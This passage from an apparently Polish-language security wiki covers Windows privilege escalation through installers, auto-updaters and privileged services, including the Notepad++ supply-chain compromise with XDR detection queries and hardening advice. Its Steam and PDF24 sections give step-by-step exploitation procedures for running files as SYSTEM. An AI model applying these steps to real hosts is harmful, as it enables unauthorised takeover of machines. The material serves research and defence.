PDF24 Creator 11.15.1 ilustruje odrębne ryzyko związane z naprawą MSI: niestandardowa akcja instalująca drukarkę może podczas naprawy uruchomić widoczną konsolę z uprawnieniami SYSTEM. W wersji 11.15.2 dostawca zmienił instalator MSI, aby rozwiązać ten problem. Starsza wersja produktu to jedynie trop do wstępnej analizy. Sprawdź zarejestrowany lub dostępny pakiet MSI, czy użytkownik może zainicjować naprawę, czy występują podatna niestandardowa akcja i opóźnienie zapisu pliku dziennika oraz czy interaktywny pulpit może ujawnić konsolę. Zgłoszone opóźnienie uzyskano za pomocą oplocka na `faxPrnInst.log`; zwykłe uprawnienie do zapisu pliku nie jest jedynym warunkiem dostępu. Nieinteraktywna powłoka, niedostępny pakiet lub załatany instalator mogą przerwać łańcuch. Ten problem nie zależy od `AlwaysInstallElevated` i różni się od podmiany przewidywalnego skryptu tymczasowego.

---
## Zdalne przejęcie łańcucha dostaw przez słabą walidację aktualizatora (WinGUp / Notepad++)

Od czerwca 2025 r. do grudnia 2025 r. atakujący, którzy przejęli infrastrukturę hostingową obsługującą proces aktualizacji Notepad++, selektywnie dostarczali wybranym ofiarom złośliwe manifesty. Starsze aktualizatory oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc złośliwa odpowiedź XML mogła przekierować klientów na adresy URL kontrolowane przez atakujących. Ponieważ klient akceptował treści HTTPS bez weryfikacji zaufanego łańcucha certyfikatów i prawidłowego podpisu PE pobranego instalatora, ofiary pobierały i uruchamiały trojanizowany plik NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Przebieg operacji (nie wymaga lokalnego exploita):
1. **Przechwycenie infrastruktury**: przejęcie CDN/hostingu i odpowiadanie na żądania sprawdzenia aktualizacji metadanymi atakującego wskazującymi na złośliwy adres URL pobierania.
2. **Trojanizowany NSIS**: instalator pobiera/uruchamia payload i wykorzystuje dwa łańcuchy wykonania:
   - **Użycie własnego podpisanego pliku binarnego + sideload**: dołączenie podpisanego pliku Bitdefender `BluetoothService.exe` i umieszczenie złośliwego `log.dll` w jego ścieżce wyszukiwania. Po uruchomieniu podpisanego pliku binarnego Windows ładuje `log.dll` przez sideloading; biblioteka odszyfrowuje i ładuje refleksyjnie backdoor Chrysalis (zabezpieczony przez Warbird + haszowanie API utrudniające analizę statyczną).
   - **Wstrzykiwanie shellcode’u za pomocą skryptu**: NSIS uruchamia skompilowany skrypt Lua, który używa Win32 API (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode’u i przygotowania Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Wskazówki dotyczące wzmacniania zabezpieczeń i wykrywania dla dowolnego auto-updatera:
- Wymuszaj **weryfikację certyfikatu i podpisu** pobranego instalatora (przypnij podpisującego dostawcę, odrzucaj niezgodny CN/łańcuch) i podpisuj sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania kontrolowane przez manifest, o ile nie zostały zweryfikowane.
- Traktuj **sideloading własnego podpisanego pliku binarnego** jako punkt zwrotny wykrywania po pobraniu: generuj alerty, gdy podpisany plik EXE dostawcy ładuje bibliotekę DLL spoza kanonicznej ścieżki instalacji (np. Bitdefender ładuje `log.dll` z Temp/Downloads), a także gdy aktualizator umieszcza w katalogu tymczasowym lub uruchamia instalatory bez podpisów dostawcy.
- Monitoruj **artefakty charakterystyczne dla malware** zaobserwowane w tym łańcuchu (przydatne jako ogólne punkty zaczepienia): mutex `Global\Jdhfv_1.0.1`, nietypowe zapisy `gup.exe` w `%TEMP%` oraz etapy wstrzykiwania shellcode’u sterowane przez Lua.
- Notepad++ zareagował, wzmacniając WinGUp w wersji v8.8.9 i nowszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze kompilacje wymuszają weryfikację certyfikatu i podpisu pobranego instalatora zamiast polegać wyłącznie na zabezpieczeniach transportu.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading podpisanego przez Bitdefender pliku EXE `log.dll` (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż instalator Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Te wzorce można uogólnić na każdy updater, który akceptuje niepodpisane manifesty lub nie przypina podpisujących instalatorów — przejęcie ruchu sieciowego + złośliwy instalator + sideloading podpisany własnym certyfikatem umożliwiają zdalne wykonanie kodu pod pozorem „zaufanych” aktualizacji.

### Konfiguracja powiadomień jako drugi wyzwalacz aktualizacji

Updater może używać osobnych konfiguracji zdalnych do **przygotowania zawartości i wyzwolenia jej wykonania**. Wymaga to kontroli nad konfiguracjami lub odpowiedziami; raporty nie wskazują, w jaki sposób uzyskano dostęp do źródła. W przypadku AOMEI plik `down_html.ini` wskazywał URL archiwum, wersję (`thrid`) i MD5 (`Val`); atakujący podniósł wersję oraz zmienił URL i odpowiadającą mu sumę kontrolną. To opisany wyżej [błąd granicy zaufania metadanych](#2-hijacking-the-update-channel-to-run-code-as-system). Dodatkową ścieżką wykonania był plik `Notifycfg.ini`: kierował on `ABNotify.exe` do załadowania rozpakowanego pliku `upgrade-now.html` za pomocą lokalnego URL `file:///` w WebView. Strona automatycznie przechodziła do pliku wykonywalnego w tym samym katalogu, który WebView przekazywał powłoce systemowej. Proces potomny dziedziczył uprawnienia procesu powiadamiającego; samo to nie podnosiło jego uprawnień do SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google opisało również zmodyfikowany plik `Notifycfg.ini` zawierający ponad 35 000 powtarzających się sekcji-wypełniaczy, które omijały zwykłą kontrolę wersji tego klienta. Raport nie dowodzi istnienia ogólnego obejścia parsera. Atakujący przywracali pliki zdalne po oknach trwających od pięciu do dziesięciu minut, więc zmienioną konfigurację otrzymywali tylko klienci odpytujący serwer w tym czasie. Ten kanał powiadomień przenosił też odrębną [przynętę wymuszającą WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), która nie wymagała wykonania archiwum.<sup>[[18]](#references)</sup>

---
## Inicjowanie komunikacji IPC z uprzywilejowaną usługą przez pamięć współdzieloną

Nie ograniczaj się do enumeracji nazwanych potoków. Broker SYSTEM może udostępniać liberalnie skonfigurowany nazwany **obiekt mapowania pliku** do zestawiania połączenia, a następnie duplikować anonimowe uchwyty potoków do procesu żądającego. W testowanym rozwiązaniu Steam obiekty `Global\SteamClientService_SharedMemFile` i `Global\SteamClientService_SharedMemLock` koordynują uzgadnianie PID klienta i zdarzenia; usługa zwraca dwa uchwyty potoków, a kolejne żądania z prefiksem długości korzystają z `RunInterface` (`0x01`). DACL mapowania dopuszczał klientów na dowolnym poziomie integralności. Wewnętrzny obiekt `CSteamServiceWin32` w `steamclient64.dll` zapewniał praktyczny klient: odszukaj globalną zmienną właściwą dla danej kompilacji, wywołaj `Connect` z pozycji 0 vtable, a następnie użyj map interfejsów zamiast ponownie implementować uzgadnianie. Dostęp do IPC jest tylko warunkiem wstępnym; o tym, czy dojdzie do eskalacji, decyduje sposób weryfikacji zaufania przez uprzywilejowany handler. <sup>[[19]](#references)[[20]](#references)</sup>

### Podpisany manifest rozszerza się do nieaktualnej listy dozwolonych plików wykonywalnych

`IClientInstallUtils::AddInstallScriptToWhiteList` (pozycja 21) weryfikuje `kvsignatures` podpisanego pliku VDF, ale zapisuje **rozwiniętą ścieżkę pliku wykonywalnego**, a nie niezmienną tożsamość pliku. W przypadku podpisanego wpisu `Run Process`, takiego jak `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, podaj zapisywalny przez użytkownika `%INSTALLDIR%`. Umieść plik zastępczy dokładnie pod tą rozwiniętą ścieżką, a następnie wywołaj `RunInstallScript` (pozycja 22) z niepodpisanym plikiem VDF, którego `Process 1` wskazuje ścieżkę z listy dozwolonych. Wpis pozostaje aktywny po wykonaniu podpisanego skryptu, aż do ponownego uruchomienia usługi; w opisanej implementacji przed uruchomieniem z uprawnieniami SYSTEM nie następuje ponowna weryfikacja pliku. Nazwa podstawionego pliku musi odpowiadać rzeczywistemu podpisanemu wpisowi, a nie tylko kategorii składnika wymaganego. <sup>[[19]](#references)[[20]](#references)</sup>

### Proces potomny menedżera modułów omija kontrolę podpisu przy bezpośrednim ładowaniu

`IClientModuleManager::LoadModule` (pozycja 0) akceptuje bajty modułu, jeśli podany identyfikator odpowiada ich CRC32. `CallFunctionAsync` (pozycja 3) z `flags & 8` wybiera gałąź **procesu potomnego**, a nie gałąź bezpośredniego ładowania refleksyjnego, która weryfikuje podpis Valve. Usługa zapisuje `legacycompat\servicecall_<CRC>.dll` i uruchamia `legacycompat\steamservice.exe /runfunc ...` z katalogu instalacyjnego. Jeśli katalog ten jest zapisywalny przez użytkownika, umieść plik wykonywalny pod drugą z tych ścieżek, załaduj dowolny tymczasowy moduł z pasującym CRC, a następnie wywołaj metodę asynchroniczną z ustawionym bitem 3. W opisanej kompilacji ani plik wykonywalny procesu potomnego, ani DLL zapisana na dysku nie były uwierzytelniane. Sam moduł nie musi być działającym payloadem: to podstawiony plik wykonywalny procesu potomnego zostaje uruchomiony jako SYSTEM. <sup>[[19]](#references)[[20]](#references)</sup>

### Weryfikacja elementu katalogu przed instalacją sterownika z podwyższonymi uprawnieniami

W przypadku brokera instalującego sterowniki sprawdź, czy walidacja katalogu wiąże **dokładny plik INF przekazywany instalatorowi**. W opisanej ścieżce `InstallVrLinkDongleDriver` funkcja `WinVerifyTrust` weryfikuje katalog, a `CryptCATAdminCalcHashFromFileHandle` wyszukuje *co najmniej jeden* pasujący plik w katalogu wskazanym przez wywołującego. Usługa uruchamia jednak następnie `pnputil /add-driver ... /install` dla `netrtwlanuval.inf`, nie ustalając, czy ten plik INF jest zamierzonym elementem katalogu. Akceptowany jest płaski katalog lub katalog specyficzny dla architektury. Dlatego podpisany katalog zawierający dowolny pasujący element wskazanego katalogu może przejść słabą kontrolę usługi, nawet jeśli plik INF przekazany uprzywilejowanemu instalatorowi jest inny. Nie zakładaj, że samo to omija zasady Windows dotyczące podpisywania sterowników: powodzenie instalacji nadal zależy od zastępczego pakietu i zasad obowiązujących na hoście. <sup>[[19]](#references)[[20]](#references)</sup>

Usługa zwalnia uchwyty używane do walidacji, zanim `pnputil` otworzy plik INF, pozostawiając [lukę TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk), której celem jest instalacja sterownika, a nie aktualizacja pliku wykonywalnego. Oplock może umożliwić wstawienie pliku zastępczego między sprawdzeniem a otwarciem go przez instalator. To samo IPC udostępnia [przekazywanie danych wejściowych na bezpieczny pulpit](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring), przy odrębnych warunkach dotyczących zgody. <sup>[[19]](#references)</sup>

## References
- [1] [Advisory – Netskope Client for Windows – lokalna eskalacja uprawnień przez złośliwy serwer (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Biuletyn bezpieczeństwa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – klient/exploit IPC dla Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – przejmowanie ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – lokalna eskalacja uprawnień przez zapisywalne pliki w Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – eskalacja uprawnień w agencie Windows](https://checkmk.com/werk/16361)
- [10] [Proof of concept sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – aktorzy wspierani przez państwa wykorzystują łańcuch dostaw Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aktualizacja dotycząca incydentu przejęcia infrastruktury](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – omijanie poprawki CVE-2025-0309 w Netskope Client dla Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – odkrywanie błędów eskalacji uprawnień w Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: od gRPC do SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – naruszenie łańcucha dostaw AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group i Mandiant – badanie krótkotrwałego manipulowania łańcuchem dostaw](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – przejęcie Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – proof of concept do przejęcia Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
